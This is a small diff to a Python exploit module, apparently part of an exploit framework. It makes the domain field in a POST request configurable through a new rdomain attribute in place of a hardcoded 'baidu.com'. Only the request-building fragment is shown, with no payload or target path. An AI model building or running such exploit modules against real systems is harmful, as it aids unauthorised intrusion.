@@ -26,11 +26,12 @@ class Exploit(HTTPClient):
 
     def run(self):
         domain=(self.target)
+        rdoa=(self.rdomain)
         data = {
             'b2':1,
             'b3':1,
             'b4':1,
-            'domain':'baidu.com',
+            'domain':'{}'.format(rdoa),
         }
         response = self.http_request(
             method="POST",
